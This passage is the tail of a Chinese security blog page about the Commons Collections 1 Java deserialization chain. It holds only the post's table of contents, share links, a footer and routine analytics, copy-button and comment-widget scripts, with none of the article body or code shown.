        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E4%BB%80%E4%B9%88%E6%98%AF%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%9F%E4%BB%80%E4%B9%88%E6%98%AFCC%E9%93%BE"><span class="toc-number">2.</span> <span class="toc-text">0x01 什么是利用链？什么是CC链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">3.</span> <span class="toc-text">0x02 环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">0x03 分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">4.1.</span> <span class="toc-text">前置知识点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-InvokerTransformer"><span class="toc-number">4.2.</span> <span class="toc-text">1. InvokerTransformer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-ChainedTransformer"><span class="toc-number">4.3.</span> <span class="toc-text">2.ChainedTransformer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-ConstantTransformer-%E7%B1%BB"><span class="toc-number">4.4.</span> <span class="toc-text">3. ConstantTransformer 类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-TransformedMap%E7%B1%BB"><span class="toc-number">4.5.</span> <span class="toc-text">4 TransformedMap类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#put"><span class="toc-number">4.5.1.</span> <span class="toc-text">put()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#checkSetValue"><span class="toc-number">4.5.2.</span> <span class="toc-text">checkSetValue()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-AnotationInvocationHandler%E7%B1%BB"><span class="toc-number">4.6.</span> <span class="toc-text">5. AnotationInvocationHandler类</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E5%B0%8F%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">0x04 小结</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.anch0r.top/2024/01/21/Commons%20Collections%201%20%E5%88%A9%E7%94%A8%E9%93%BE/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.anch0r.top/2024/01/21/Commons%20Collections%201%20%E5%88%A9%E7%94%A8%E9%93%BE/&text=Commons Collections 1 利用链"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.anch0r.top/2024/01/21/Commons%20Collections%201%20%E5%88%A9%E7%94%A8%E9%93%BE/&title=Commons Collections 1 利用链"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.anch0r.top/2024/01/21/Commons%20Collections%201%20%E5%88%A9%E7%94%A8%E9%93%BE/&is_video=false&description=Commons Collections 1 利用链"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Commons Collections 1 利用链&body=Check out this article: https://blog.anch0r.top/2024/01/21/Commons%20Collections%201%20%E5%88%A9%E7%94%A8%E9%93%BE/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.anch0r.top/2024/01/21/Commons%20Collections%201%20%E5%88%A9%E7%94%A8%E9%93%BE/&title=Commons Collections 1 利用链"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.anch0r.top/2024/01/21/Commons%20Collections%201%20%E5%88%A9%E7%94%A8%E9%93%BE/&title=Commons Collections 1 利用链"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.anch0r.top/2024/01/21/Commons%20Collections%201%20%E5%88%A9%E7%94%A8%E9%93%BE/&title=Commons Collections 1 利用链"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.anch0r.top/2024/01/21/Commons%20Collections%201%20%E5%88%A9%E7%94%A8%E9%93%BE/&title=Commons Collections 1 利用链"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.anch0r.top/2024/01/21/Commons%20Collections%201%20%E5%88%A9%E7%94%A8%E9%93%BE/&name=Commons Collections 1 利用链&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.anch0r.top/2024/01/21/Commons%20Collections%201%20%E5%88%A9%E7%94%A8%E9%93%BE/&t=Commons Collections 1 利用链"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2024-2025
    anch0r
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
      --><li><a href="/">首页</a></li><!--
    --><!--
      --><li><a href="/archives/">归档</a></li><!--
    --><!--
      --><li><a href="/categories/">categories</a></li><!--
    --><!--
      --><li><a href="/tags/">tags</a></li><!--
    --><!--
      --><li><a href="/about/">关于</a></li><!--
    --><!--
      --><li><a href="/search/">搜索</a></li><!--
    -->
      </ul>
      <ul>
        
          <!-- 不蒜子统计 -->
          <span id="busuanzi_container_site_pv">
              本站总访问量<span id="busuanzi_value_site_pv"></span>次
          </span>
          <span class="post-meta-divider">|</span>
          <span id="busuanzi_container_site_uv" style='display:none'>
                  本站访客数<span id="busuanzi_value_site_uv"></span>人
          </span>
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
        
      </ul>
    </nav>
  </div>
  
</footer>


    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功！");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

  <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?9ff526edfca1e553fd58a8876eb755c9";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
        </script>

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->



<!-- Waline Comments -->

  <script type="module">
    import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';

    var EMOJI = ['//unpkg.com/@waline/emojis@1.2.0/weibo']
    var META = ['nick', 'mail', 'link'];
    var REQUIREDFIELDS = ['nick', 'mail', 'link'];

    var emoji = '//unpkg.com/@waline/emojis@1.2.0/qq'.split(',').filter(function(item){
      return item !== ''; // filter()返回满足不为空item
    });
    emoji = emoji.length == 0 ? EMOJI : emoji;

    var meta = 'nick,mail'.split(',').filter(function(item){
      return META.indexOf(item) > -1; // filter()返回满足META.indexOf(item) > -1为true的item
    });
    meta = meta.length == 0 ? META : meta;

    var requiredFields = 'nick,mail'.split(',').filter(function(item){
      return REQUIREDFIELDS.indexOf(item) > -1; // filter()返回满足META.indexOf(item) > -1为true的item
    });
    requiredFields = requiredFields.length == 0 ? REQUIREDFIELDS : requiredFields;

    init({
      el: '#waline_thread',
      serverURL: 'https://comment.anch0r.top', // Waline 的服务端地址
      path: '' == '' ? window.location.pathname : '', // 当前文章页路径，用于区分不同的文章页，以保证正确读取该文章页下的评论列表
      lang: 'zh-CN' == '' ? 'zh-CN' : 'zh-CN', // 多语言支持，未设置默认英文
      emoji: emoji,
      dark: 'true', // 暗黑模式适配
      commentSorting: '' == '' ? 'latest' : '', // 评论列表排序方式
      meta: meta, // 评论者相关属性
      requiredFields: requiredFields, // 设置必填项，默认匿名
      login: '', // 登录模式状态
      wordLimit: '', // 评论字数限制
      pageSize: '10' == '' ? 10 : '10', // 评论列表分页，每页条数
      imageUploader: '', // 自定义图片上传方法
      highlighter: '', // 代码高亮
      placeholder: '',
      avatar: 'mm',
      visitor: 'false',
      comment_count: 'true',
    });
  </script>



</body>
</html>
